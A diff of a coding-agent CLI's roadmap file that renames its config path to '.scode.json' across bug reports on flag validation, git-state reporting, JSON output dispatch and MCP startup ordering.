+     **Acceptance.** `scode status --output-format json` on a `.scode.json` with a parse error surfaces `config_parse_errors` in the structured output. Acceptance profile for `.scode.json` is consistent (strict JSON, OR explicit JSON5). The phrase "defaultMode: default" resolves to a mode that matches the English meaning of the word "default," not its most-aggressive alias. A user's attempt to express an intent-to-be-safe never produces a DangerFullAccess runtime without explicit stderr + JSON surface telling them so.
 
      **Blocker.** Policy decisions (strict vs JSON5; alias table meanings; fallback mode when config drop happens) overlap with #86 + #87 + #115 + #116 decisions. Resolving all five together as a "permission-posture-plus-config-parsing audit" would be efficient.
 
@@ -4322,7 +4322,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      6. *De-duplicate `message` and `report`.* Pick one (`report` is more descriptive for a doctor JSON surface); drop `message`. ~5 lines.
      7. *Regression tests.* (a) Claude Code hooks format parses and runs. (b) Native-format hooks still work. (c) Matcher regex matches correct tools. (d) All 8 event types dispatch. (e) Doctor failure emits single JSON object. (f) Doctor JSON has no duplicated fields.
 
-     **Acceptance.** A user's `.claude.json` hooks block works verbatim as `.nexus/sudocode.json` hooks. Error messages correctly distinguish "wrong type for array elements" from "wrong element structure." `scode --output-format json doctor` emits exactly ONE JSON document regardless of failure state. No duplicated fields.
+     **Acceptance.** A user's `.claude.json` hooks block works verbatim as `.scode.json` hooks. Error messages correctly distinguish "wrong type for array elements" from "wrong element structure." `scode --output-format json doctor` emits exactly ONE JSON document regardless of failure state. No duplicated fields.
 
      **Blocker.** Implementation work is sizable (~200 lines + tests + migration docs). Product decision needed: full Claude Code hooks compatibility as a goal, or subset-plus-adapter. The current schema is sudo-code-native; Claude Code compat requires either extending or replacing.
 
@@ -4514,7 +4514,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      4. *Duplicate-with-case-variants silently accepted.* `bash,Bash,BASH` all normalize to the same canonical but produce no warning. An agent programmatically generating tool lists can bloat its input with case variants without the runtime pushing back.
      5. *Allowed-tools not surfaced in status/doctor JSON.* Pass `--allowedTools Bash` and `status` gives no indication that only Bash is allowed. An agent preflighting a run cannot verify the runtime's view of what's allowed.
      6. *Joins #97 (--allowedTools empty-string silently blocks all).* Same flag, different axis of silent-acceptance-without-surface-feedback. #97 + #123 are both trust-gap failures for the same surface.
-     7. *Joins parallel-entry-point asymmetry.* `.nexus/sudocode.json permissions.allow` vs `--allowedTools` flag — do they accept the same normalization? Worth separate sweep. If yes, the inconsistency is user-invisible in both; if no, users have to remember two separate conventions.
+     7. *Joins parallel-entry-point asymmetry.* `.scode.json permissions.allow` vs `--allowedTools` flag — do they accept the same normalization? Worth separate sweep. If yes, the inconsistency is user-invisible in both; if no, users have to remember two separate conventions.
      8. *Joins silent-flag / documented-but-unenforced.* Convention isn't documented; whitespace-separator isn't documented; duplicate tolerance isn't documented.
 
      **Fix shape — symmetric normalization + surface to JSON + document.**
@@ -4529,7 +4529,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Blocker.** None. Localized in `rust/crates/tools/src/lib.rs:370` + status/doctor JSON plumbing.
 
-     **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdZZ` on main HEAD `2bf2a11` in response to Sudocodehip pinpoint nudge at `1494993419536306176`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116, #117, #118, #119, #121, #122) as 16th member — `--allowedTools` has undocumented whitespace-separator behavior, undocumented normalization asymmetry, and silent duplicate-acceptance. Joins **Permission-audit / tool-allow-list** (#94, #97, #101, #106, #115, #120) as 7th — asymmetric normalization means scode allow-lists don't round-trip cleanly between canonical representations. Joins **Truth-audit / diagnostic-integrity** — status/doctor JSON hides what the allowed-tools set actually is. Joins **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114, #117, #122) as 9th — `--allowedTools` vs `.nexus/sudocode.json permissions.allow` are two entry points that likely disagree on normalization (worth separate sweep). Natural bundle: **#97 + #123** — `--allowedTools` trust-gap pair: empty silently blocks (#97) + asymmetric normalization + invisible runtime state (#123). Also **Flagship permission-audit sweep 8-way (grown)**: #50 + #87 + #91 + #94 + #97 + #101 + #115 + **#123**. Also **Permission-audit 7-way (grown)**: #94 + #97 + #101 + #106 + #115 + #120 + **#123**. Session tally: ROADMAP #123.
+     **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdZZ` on main HEAD `2bf2a11` in response to Sudocodehip pinpoint nudge at `1494993419536306176`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116, #117, #118, #119, #121, #122) as 16th member — `--allowedTools` has undocumented whitespace-separator behavior, undocumented normalization asymmetry, and silent duplicate-acceptance. Joins **Permission-audit / tool-allow-list** (#94, #97, #101, #106, #115, #120) as 7th — asymmetric normalization means scode allow-lists don't round-trip cleanly between canonical representations. Joins **Truth-audit / diagnostic-integrity** — status/doctor JSON hides what the allowed-tools set actually is. Joins **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114, #117, #122) as 9th — `--allowedTools` vs `.scode.json permissions.allow` are two entry points that likely disagree on normalization (worth separate sweep). Natural bundle: **#97 + #123** — `--allowedTools` trust-gap pair: empty silently blocks (#97) + asymmetric normalization + invisible runtime state (#123). Also **Flagship permission-audit sweep 8-way (grown)**: #50 + #87 + #91 + #94 + #97 + #101 + #115 + **#123**. Also **Permission-audit 7-way (grown)**: #94 + #97 + #101 + #106 + #115 + #120 + **#123**. Session tally: ROADMAP #123.
 
 124. **`--model` accepts any string with zero validation — typos like `sonet` silently pass through to the API where they fail late with an opaque error; empty string `""` is silently accepted as a model name; `status` JSON shows the resolved model but not the user's raw input, so post-hoc debugging of "why did my model flag not work?" requires re-reading the process argv** — dogfooded 2026-04-18 on main HEAD `bb76ec9` from `/tmp/cdAA2`.
 
@@ -4558,7 +4558,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      "claude-opus-4-6"
 
      # Config-defined aliases also resolve:
-     $ echo '{"aliases":{"my-fav":"claude-opus-4-7"}}' > .nexus/sudocode.json
+     $ echo '{"aliases":{"my-fav":"claude-opus-4-7"}}' > .scode.json
      $ scode --model my-fav --output-format json status | jq .model
      "claude-opus-4-7"
 
@@ -4589,7 +4589,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      2. *No pre-flight check.* `scode --model unknown-model status` succeeds with exit 0. An agent preflighting with `status` cannot detect that the model is bogus until it actually makes an API call.
      3. *Empty string accepted.* `--model ""` is a runtime bomb: the model string is empty, and the API request will fail with a confusing "model is required" or similar empty-field error.
      4. *`status` JSON doesn't show model provenance.* An agent reading `{model: "sonet"}` can't tell if the user typed `sonet` (typo), if it's a config alias that resolved to `sonet`, or if it's the default. No `model_source: "flag"|"config"|"default"` field.
-     5. *Joins #105 (4-surface model disagreement).* #105 said `status` ignores `.nexus/sudocode.json` model, doctor mislabels aliases. **#124** adds: `--model` flag input isn't validated or provenance-tracked, so the model field in status is unverifiable from outside.
+     5. *Joins #105 (4-surface model disagreement).* #105 said `status` ignores `.scode.json` model, doctor mislabels aliases. **#124** adds: `--model` flag input isn't validated or provenance-tracked, so the model field in status is unverifiable from outside.
      6. *Joins #122 (`--base-commit` zero validation)* — same parser pattern: flag takes any string, stores raw, no validation. `--model` and `--base-commit` are sibling unvalidated flags.
      7. *Compare `--reasoning-effort`* at `main.rs:498-510` — validates `"low"|"medium"|"high"`. Has a guard. `--model` has none.
      8. *Compare `--permission-mode`* — validates against known set. Has a guard. `--model` has none.
@@ -4605,7 +4605,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Blocker.** None. Localized across parse + status JSON + doctor check.
 
-     **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdAA2` on main HEAD `bb76ec9` in response to Sudocodehip pinpoint nudge at `1495000973914144819`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116, #117, #118, #119, #121, #122, #123) as 17th — `--model` silently accepts garbage with no validation. Joins **Truth-audit / diagnostic-integrity** — status JSON model field has no provenance. Joins **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114, #117, #122, #123) as 10th — `--model` flag, `.nexus/sudocode.json model`, and the default model are three sources that disagree (#105 adjacent). Natural bundle: **#105 + #124** — model-resolution pair: 4-surface disagreement (#105) + no validation + no provenance (#124). Also **#122 + #124** — unvalidated-flag pair: `--base-commit` accepts anything (#122) + `--model` accepts anything (#124). Same parser pattern. Session tally: ROADMAP #124.
+     **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdAA2` on main HEAD `bb76ec9` in response to Sudocodehip pinpoint nudge at `1495000973914144819`. Joins **Silent-flag / documented-but-unenforced** (#96–#101, #104, #108, #111, #115, #116, #117, #118, #119, #121, #122, #123) as 17th — `--model` silently accepts garbage with no validation. Joins **Truth-audit / diagnostic-integrity** — status JSON model field has no provenance. Joins **Parallel-entry-point asymmetry** (#91, #101, #104, #105, #108, #114, #117, #122, #123) as 10th — `--model` flag, `.scode.json model`, and the default model are three sources that disagree (#105 adjacent). Natural bundle: **#105 + #124** — model-resolution pair: 4-surface disagreement (#105) + no validation + no provenance (#124). Also **#122 + #124** — unvalidated-flag pair: `--base-commit` accepts anything (#122) + `--model` accepts anything (#124). Same parser pattern. Session tally: ROADMAP #124.
 
 125. **`git_state: "clean"` is emitted by both `status` and `doctor` JSON even when `in_git_repo: false` — a non-git directory reports the same sentinel as a git repo with no changes. `GitWorkspaceSummary::default()` returns all-zero fields; `is_clean()` checks `changed_files == 0` → true → `headline() = "clean"`. An agent checking `if git_state == "clean" then proceed` would proceed even in a non-git directory. Doctor correctly surfaces `in_git_repo: false` and `summary: "current directory is not inside a git project"`, but the `git_state` field contradicts this by claiming "clean." Separately, `scode init` creates a `.gitignore` file even in non-git directories — not harmful (ready for future `git init`) but misleading** — dogfooded 2026-04-18 on main HEAD `debbcbe` from `/tmp/cdBB2`.
 
@@ -4618,7 +4618,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      Init
        Project          /private/tmp/cdBB2
        .nexus/sudocode/           created
-       .nexus/sudocode.json       created
+       .scode.json       created
        .gitignore       created        # created in non-git dir
        CLAUDE.md        created
 
@@ -4659,7 +4659,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      2. *Contradictory fields in doctor.* `in_git_repo: false` + `git_state: "clean"` in the same check. An agent reading one field gets "not in git"; reading the other gets "git is clean." The two fields should be consistent or `git_state` should be `null`/absent when `in_git_repo` is false.
      3. *Joins truth-audit.* The "clean" sentinel is a truth claim about git state. When there's no git, the claim is vacuously true at best, actively misleading at worst.
      4. *Adjacent to #89 (scode blind to mid-rebase/merge).* #89 said git_state doesn't capture rebase/merge/cherry-pick. **#125** says git_state also doesn't capture "not in git" — another missing state.
-     5. *Minor: `scode init` creates `.gitignore` without git.* Not harmful but joins the pattern of init producing artifacts for absent subsystems (`.gitignore` without git, `.nexus/sudocode.json` with `dontAsk` per #115).
+     5. *Minor: `scode init` creates `.gitignore` without git.* Not harmful but joins the pattern of init producing artifacts for absent subsystems (`.gitignore` without git, `.scode.json` with `dontAsk` per #115).
 
      **Fix shape — null `git_state` when not in git repo.**
      1. *Return `None` from `parse_git_workspace_summary` when status is `None`.* Change return type to `Option<GitWorkspaceSummary>`. ~10 lines.
@@ -4719,7 +4719,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
 
      **Source.** Jobdori dogfood 2026-04-18 against `/tmp/cdFF2` on main HEAD `b56841c` in response to Sudocodehip pinpoint nudge at `1495023618529300580`. Joins **Silent-flag / documented-but-unenforced** — section argument silently ignored. Joins **Truth-audit** — help promises section-specific inspection that doesn't exist. Joins **Dispatch-collapse family**: #111 (2-way) + #118 (3-way) + **#126** (4-way). Natural bundle: **#111 + #118 + #126** — dispatch-collapse trio: complete parser-dispatch-collapse audit across slash commands. Session tally: ROADMAP #126.
 
-127. **`scode <subcommand> --json` and `scode <subcommand> <ANY-EXTRA-ARG>` silently fall through to LLM Prompt dispatch — every diagnostic verb (`doctor`, `status`, `sandbox`, `skills`, `version`, `help`) accepts the documented `--output-format json` global only BEFORE the subcommand. The natural shape `scode doctor --json` parses as: subcommand=`doctor` is consumed, then `--json` becomes prompt text, the parser dispatches to `CliAction::Prompt { prompt: "--json" }`, the prompt path demands Anthropic credentials, and a fresh box with no auth fails hard with exit=1. Same for `scode doctor --garbageflag`, `scode doctor garbage args here`, `scode status --json`, `scode skills --json`, etc. The text-mode form `scode doctor` works fine without auth (it's a pure local diagnostic), so this is a pure CLI-surface failure that breaks every observability tool that pipes JSON. README.md says "`scode doctor` should be your first health check" — but any agent, CI step, or monitoring tool that adds `--json` to that exact suggested command gets a credential-required error instead of structured output** — dogfooded 2026-04-20 on main HEAD `7370546` from `/tmp/scode-dogfood` (no `.git`, no `.nexus/sudocode.json`, all `ANTHROPIC_*` / `OPENAI_*` env vars unset via `env -i`).
+127. **`scode <subcommand> --json` and `scode <subcommand> <ANY-EXTRA-ARG>` silently fall through to LLM Prompt dispatch — every diagnostic verb (`doctor`, `status`, `sandbox`, `skills`, `version`, `help`) accepts the documented `--output-format json` global only BEFORE the subcommand. The natural shape `scode doctor --json` parses as: subcommand=`doctor` is consumed, then `--json` becomes prompt text, the parser dispatches to `CliAction::Prompt { prompt: "--json" }`, the prompt path demands Anthropic credentials, and a fresh box with no auth fails hard with exit=1. Same for `scode doctor --garbageflag`, `scode doctor garbage args here`, `scode status --json`, `scode skills --json`, etc. The text-mode form `scode doctor` works fine without auth (it's a pure local diagnostic), so this is a pure CLI-surface failure that breaks every observability tool that pipes JSON. README.md says "`scode doctor` should be your first health check" — but any agent, CI step, or monitoring tool that adds `--json` to that exact suggested command gets a credential-required error instead of structured output** — dogfooded 2026-04-20 on main HEAD `7370546` from `/tmp/scode-dogfood` (no `.git`, no `.scode.json`, all `ANTHROPIC_*` / `OPENAI_*` env vars unset via `env -i`).
 
      **Concrete repro.**
      ```
@@ -4829,19 +4829,19 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      ```
      Validation happens in `validate_model_syntax()` before `resolve_model_alias_with_config()`. All `--model` and `--model=` parse paths call it. No API call ever reached with malformed input. Residual gap (model provenance in status JSON — raw input vs resolved value) was split off as #148 (see below).
 
-129. **MCP server startup blocks credential validation — `scode <prompt>` with any `.nexus/sudocode.json` `mcpServers` entry awaits the MCP server's stdio handshake BEFORE checking whether the operator has Anthropic credentials. With no `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY` set and `mcpServers.everything = { command: "npx", args: ["-y", "@modelcontextprotocol/server-everything"] }` configured, the CLI hangs forever (verified via `timeout 30s` — still in MCP startup at 30s with three repeated `"Starting default (STDIO) server..."` lines), instead of fail-fasting with the same `missing Anthropic credentials` error that fires in milliseconds when no MCP is configured. A misconfigured-but-running MCP server (one that spawns successfully but never completes its `initialize` handshake) wedges every `scode <prompt>` invocation permanently. A misconfigured MCP server with a slow-but-eventually-succeeding init (npx download, container pull, network roundtrip) burns startup latency on every Prompt invocation regardless of whether the LLM call would even succeed. This is the runtime-side companion to #102's config-time MCP diagnostic gap: #102 says doctor doesn't surface MCP reachability; #129 says the Prompt path's reachability check is implicit, blocking, retried, and runs *before* the cheaper auth precondition that should run first** — dogfooded 2026-04-20 on main HEAD `d284ef7` from `/tmp/scode-mcp-test` with `env -i PATH=$PATH HOME=$HOME` (all auth env vars unset).
+129. **MCP server startup blocks credential validation — `scode <prompt>` with any `.scode.json` `mcpServers` entry awaits the MCP server's stdio handshake BEFORE checking whether the operator has Anthropic credentials. With no `ANTHROPIC_AUTH_TOKEN` / `ANTHROPIC_API_KEY` set and `mcpServers.everything = { command: "npx", args: ["-y", "@modelcontextprotocol/server-everything"] }` configured, the CLI hangs forever (verified via `timeout 30s` — still in MCP startup at 30s with three repeated `"Starting default (STDIO) server..."` lines), instead of fail-fasting with the same `missing Anthropic credentials` error that fires in milliseconds when no MCP is configured. A misconfigured-but-running MCP server (one that spawns successfully but never completes its `initialize` handshake) wedges every `scode <prompt>` invocation permanently. A misconfigured MCP server with a slow-but-eventually-succeeding init (npx download, container pull, network roundtrip) burns startup latency on every Prompt invocation regardless of whether the LLM call would even succeed. This is the runtime-side companion to #102's config-time MCP diagnostic gap: #102 says doctor doesn't surface MCP reachability; #129 says the Prompt path's reachability check is implicit, blocking, retried, and runs *before* the cheaper auth precondition that should run first** — dogfooded 2026-04-20 on main HEAD `d284ef7` from `/tmp/scode-mcp-test` with `env -i PATH=$PATH HOME=$HOME` (all auth env vars unset).
 
      **Concrete repro.**
      ```
      # Baseline (no MCP, no auth) — fail-fast in milliseconds:
-     $ cd /tmp/empty-no-mcp && rm -f .nexus/sudocode.json
+     $ cd /tmp/empty-no-mcp && rm -f .scode.json
      $ time env -i PATH=$PATH HOME=$HOME scode "what is two plus two"
      error: missing Anthropic credentials; export ANTHROPIC_AUTH_TOKEN or ANTHROPIC_API_KEY ...
      real    0m0.04s
 
      # With one working MCP (no auth) — hangs indefinitely:
      $ cd /tmp/scode-mcp-test
-     $ cat .nexus/sudocode.json
+     $ cat .scode.json
      {
        "mcpServers": {
          "everything": {
@@ -4858,7 +4858,7 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      # exit=124
 
      # With one bogus MCP binary (no auth) — fail-fast still works:
-     $ cat .nexus/sudocode.json
+     $ cat .scode.json
      {"mcpServers": {"bogus": {"command": "/this/does/not/exist", "args": []}}}
      $ env -i PATH=$PATH HOME=$HOME scode "what is two plus two"
      error: missing Anthropic credentials ...   # spawn-fail is silent and cheap; cred check still wins
@@ -4869,14 +4869,14 @@ ear], /color [scheme], /effort [low|medium|high], /fast, /summary, /tag [label],
      - The Prompt dispatch in `rust/crates/rusty-claude-cli/src/main.rs` enters the runtime initialization sequence which, per #102's `mcp_tool_bridge` work, eagerly spawns every configured MCP server stdio child and awaits its `initialize` handshake before the first `/v1/messages` API call.
      - The credential-validation guard that emits `error: missing Anthropic credentials` runs during the API call setup phase — AFTER MCP server initialization, not before.
      - The three repeated `"Starting default (STDIO) server..."` lines in 30s show the MCP child process restart loop — if the child's `initialize` handshake takes longer than the runtime's tool-bridge wait, the runtime restarts the spawn (Lane 7 "MCP lifecycle" in PARITY.md says "merged" but the lifecycle has no startup deadline + cred-precheck ordering).
-     - Compare to `scode doctor` (text-mode), `scode status` (text-mode), `scode mcp list`, `scode mcp show <name>` — these all return cleanly with the same `.nexus/sudocode.json` because they don't enter the runtime/Prompt path. They surface MCP servers at config-time only (per #102) without spawning them.
+     - Compare to `scode doctor` (text-mode), `scode status` (text-mode), `scode mcp list`, `scode mcp show <name>` — these all return cleanly with the same `.scode.json` because they don't enter the runtime/Prompt path. They surface MCP servers at config-time only (per #102) without spawning them.
      - Compare to `scode --output-format json doctor` — returns clean 7.9kB JSON in milliseconds because doctor doesn't spawn MCP either. The Prompt-only nature of the bug means it's invisible to most diagnostic commands.
      - With the #127 fix landed (verb-suffix `--json` no longer falls through to Prompt), `scode doctor --json` no longer hits this MCP startup wedge — but ANY actual prompt invocation (`scode "..."`, `scode -p "..."`, `scode prompt "..."`, REPL `scode`, `--resume <id>` followed by chat) still does.
 
      **Why this is specifically a automatability gap.**
      1. *Auth-precondition ordering is inverted.* Cheap, deterministic precondition (cred env var present) should be checked before expensive, network-bound, externally-controlled precondition (MCP child handshake). The current order makes the MCP child a hard dependency for emitting any auth error.
      2. *MCP startup wedges every Prompt invocation indefinitely.* An agent automating `scode "check repo"` against a misbehaved MCP server gets no exit code, no error stream, no completion event. The hang is invisible to subscribers because `terminal.output` only streams when the child writes; the runtime is just polling the MCP socket.
-     3. *Hides cred-missing errors entirely.* The README first-step guidance "export your API key, run `scode prompt 'hello'`" has a known cred-error fallback if the env var is missing. With MCP configured, that fallback never fires. Onboarding regression for any user who runs `scode init` (which auto-creates `.nexus/sudocode.json`) and then forgets the API key.
+     3. *Hides cred-missing errors entirely.* The README first-step guidance "export your API key, run `scode prompt 'hello'`" has a known cred-error fallback if the env var is missing. With MCP configured, that fallback never fires. Onboarding regression for any user who runs `scode init` (which auto-creates `.scode.json`) and then forgets the API key.
      4. *Restart loop wastes resources.* Three `"Starting default (STDIO) server..."` lines in 30s = `scode` is restarting the npx child three times without surfacing the failure. Every restart costs the npx cold-start latency, the network fetch, and the MCP server's own init cost. Multiply by every scode rerun in a CI loop and the cost compounds.
      5. *Runtime-side companion to #102's config-time gap.* #102 said doctor surfaces MCP at config-time only with no liveness probe — the Prompt path's *implicit* liveness probe is now the OPPOSITE problem: it blocks forever instead of timing out structurally.
      6. *Joins truth-audit / diagnostic-integrity.* The hang is silent. No event saying "awaiting MCP handshake." No event saying "cred check skipped pending MCP init." The CLI lies by saying nothing.
@@ -5325,7 +5325,7 @@ Usage:
 ```json
 {
   "kind": "init",
-  "message": "Init\n  Project          /private/tmp/cd-1730b\n  .nexus/sudocode/           created\n  .nexus/sudocode.json       created\n  .gitignore       created\n  CLAUDE.md        created\n  Next step        Review and tailor the generated guidance"
+  "message": "Init\n  Project          /private/tmp/cd-1730b\n  .nexus/sudocode/           created\n  .scode.json       created\n  .gitignore       created\n  CLAUDE.md        created\n  Next step        Review and tailor the generated guidance"
 }
 ```
 
@@ -5333,7 +5333,7 @@ Usage:
 ```json
 {
   "kind": "init",
-  "message": "Init\n  Project          /private/tmp/cd-1730b\n  .nexus/sudocode/           skipped (already exists)\n  .nexus/sudocode.json       skipped (already exists)\n  .gitignore       skipped (already exists)\n  CLAUDE.md        skipped (already exists)\n  Next step        Review and tailor the generated guidance"
+  "message": "Init\n  Project          /private/tmp/cd-1730b\n  .nexus/sudocode/           skipped (already exists)\n  .scode.json       skipped (already exists)\n  .gitignore       skipped (already exists)\n  CLAUDE.md        skipped (already exists)\n  Next step        Review and tailor the generated guidance"
 }
 ```
 
@@ -5362,14 +5362,14 @@ Add structured fields alongside `message` (keep `message` for backward compat):
 {
   "kind": "init",
   "project_path": "/private/tmp/cd-1730b",
-  "created": [".nexus/sudocode", ".nexus/sudocode.json", ".gitignore", "CLAUDE.md"],
+  "created": [".nexus/sudocode", ".scode.json", ".gitignore", "CLAUDE.md"],
   "skipped": [],
   "next_step": "Review and tailor the generated guidance",
   "message": "Init\n  Project..."
 }
 ```
 
-On idempotent call: `created: []`, `skipped: [".nexus/sudocode", ".nexus/sudocode.json", ...]`.
+On idempotent call: `created: []`, `skipped: [".nexus/sudocode", ".scode.json", ...]`.
 
 **Acceptance.**
 - `scode init --output-format json` has `created`, `skipped`, `project_path`, `next_step` top-level fields
@@ -5384,13 +5384,13 @@ On idempotent call: `created: []`, `skipped: [".nexus/sudocode", ".nexus/sudocod
 
 ## Pinpoint #143. `scode status` hard-fails on malformed MCP config; `scode doctor` degrades gracefully — inconsistent contract around partial config breakage
 
-**Gap.** Running `scode status` against a workspace with a malformed `.nexus/sudocode.json` (e.g., one `mcpServers.*` entry missing the required `command` field) crashes out at parse time with a terse error, even when the rest of the config is valid and most status fields could still be reported. `scode doctor` handles the exact same file correctly, embedding the parse error inside the typed envelope as `status: "fail"` on the `config` check while still reporting `auth`, `install source`, `workspace`, etc.
+**Gap.** Running `scode status` against a workspace with a malformed `.scode.json` (e.g., one `mcpServers.*` entry missing the required `command` field) crashes out at parse time with a terse error, even when the rest of the config is valid and most status fields could still be reported. `scode doctor` handles the exact same file correctly, embedding the parse error inside the typed envelope as `status: "fail"` on the `config` check while still reporting `auth`, `install source`, `workspace`, etc.
 
 This is both an inconsistency (two diagnostic surfaces behave differently on identical input) and a violation of Product Principle #5 (*Partial success is first-class*).
 
 **Verified on main HEAD `e73b6a2` (2026-04-21 18:30 KST):**
 
-Given a `.nexus/sudocode.json` with one valid server and one malformed entry:
+Given a `.scode.json` with one valid server and one malformed entry:
 ```json
 {
   "mcpServers": {
@@ -5403,11 +5403,11 @@ Given a `.nexus/sudocode.json` with one valid server and one malformed entry:
 `scode status` (both text and JSON modes):
 ```
 $ scode status
-error: /Users/.../.nexus/sudocode.json: mcpServers.missing-command: missing string field command
+error: /Users/.../.scode.json: mcpServers.missing-command: missing string field command
 Run `scode --help` for usage.
 
 $ scode status --output-format json
-{"error":"/Users/.../.nexus/sudocode.json: mcpServers.missing-command: missing string field command","type":"error"}
+{"error":"/Users/.../.scode.json: mcpServers.missing-command: missing string field command","type":"error"}
 ```
 
 `scode doctor --output-format json` on the *same* file:
@@ -5418,7 +5418,7 @@ $ scode status --output-format json
     {
       "name":"config",
       "status":"fail",
-      "load_error":"/Users/.../.nexus/sudocode.json: mcpServers.missing-command: missing string field command",
+      "load_error":"/Users/.../.scode.json: mcpServers.missing-command: missing string field command",
       "discovered_files":["..."],
       "discovered_files_count":5,
       "summary":"runtime config failed to load: ..."
@@ -5451,7 +5451,7 @@ Doctor keeps going and produces a full typed report. Status refuses to produce a
 "config_load_error": {
   "kind": "config_parse",
   "retryable": false,
-  "file": "/Users/.../.nexus/sudocode.json",
+  "file": "/Users/.../.scode.json",
   "field_path": "mcpServers.missing-command",
   "message": "missing string field command",
   "hint": "each mcpServers entry requires a `command` string; see USAGE.md#mcp"
@@ -5466,26 +5466,26 @@ Doctor keeps going and produces a full typed report. Status refuses to produce a
 
 **Blocker.** None for Phase 1. Phase 2 depends on the typed-error taxonomy landing (ROADMAP §4.44), but Phase 1 can ship independently and be tightened later.
 
-**Source.** Jobdori dogfood 2026-04-21 18:30 KST on main HEAD `e73b6a2`, surfaced by running `scode status` in `/Users/yeongyu/agents` which contains a `.nexus/sudocode.json` with deliberately broken MCP entries. Joins **partial-success / degraded-mode** cluster (Principle #5, Phase 6) and **surface consistency** cluster (#141 help-contract unification, #108 typo guard). Session tally: ROADMAP #143.
+**Source.** Jobdori dogfood 2026-04-21 18:30 KST on main HEAD `e73b6a2`, surfaced by running `scode status` in `/Users/yeongyu/agents` which contains a `.scode.json` with deliberately broken MCP entries. Joins **partial-success / degraded-mode** cluster (Principle #5, Phase 6) and **surface consistency** cluster (#141 help-contract unification, #108 typo guard). Session tally: ROADMAP #143.
 
 ## Pinpoint #144. `scode mcp` hard-fails on malformed MCP config — same surface inconsistency as #143, one command over
 
-**Gap.** With `scode status` fixed in #143 Phase 1, `scode mcp` is now the remaining diagnostic surface that hard-fails on a malformed `.nexus/sudocode.json`. Same input, same parse error, same partial-success violation.
+**Gap.** With `scode status` fixed in #143 Phase 1, `scode mcp` is now the remaining diagnostic surface that hard-fails on a malformed `.scode.json`. Same input, same parse error, same partial-success violation.
 
 **Verified on main HEAD `e2a43fc` (2026-04-21 18:59 KST):**
 
-Same `.nexus/sudocode.json` used for #143 repro (one valid `everything` server + one malformed `missing-command` entry).
+Same `.scode.json` used for #143 repro (one valid `everything` server + one malformed `missing-command` entry).
 
 `scode mcp`:
 ```
-error: /Users/.../.nexus/sudocode.json: mcpServers.missing-command: missing string field command
+error: /Users/.../.scode.json: mcpServers.missing-command: missing string field command
 Run `scode --help` for usage.
 ```
 Exit 1. No list. The well-formed `everything` server is invisible.
 
 `scode mcp --output-format json`:
 ```json
-{"error":"/Users/.../.nexus/sudocode.json: mcpServers.missing-command: missing string field command","type":"error"}
+{"error":"/Users/.../.scode.json: mcpServers.missing-command: missing string field command","type":"error"}
 ```
 Exit 1. Same story.
 
@@ -5711,7 +5711,7 @@ Threading: parser already knows the source (it's the arm that sets `model`). Pro
 **Acceptance.**
 - `scode --model sonnet --output-format json status` → `model: "claude-sonnet-4-6"`, `model_raw: "sonnet"`, `model_source: "flag"`.
 - `scode --model anthropic/claude-opus-4-6 --output-format json status` → `model_raw: "anthropic/claude-opus-4-6"`, `model_source: "flag"`.
-- `scode --output-format json status` (no flag) → `model_raw: null`, `model_source: "default"` (or `"env"` if `ANTHROPIC_MODEL` set; or `"config"` if `.nexus/sudocode.json` set `model`).
+- `scode --output-format json status` (no flag) → `model_raw: null`, `model_source: "default"` (or `"env"` if `ANTHROPIC_MODEL` set; or `"config"` if `.scode.json` set `model`).
 - Text mode shows same provenance.
 - Regression test: parse_args + status_json_value roundtrip asserts each source value.
 
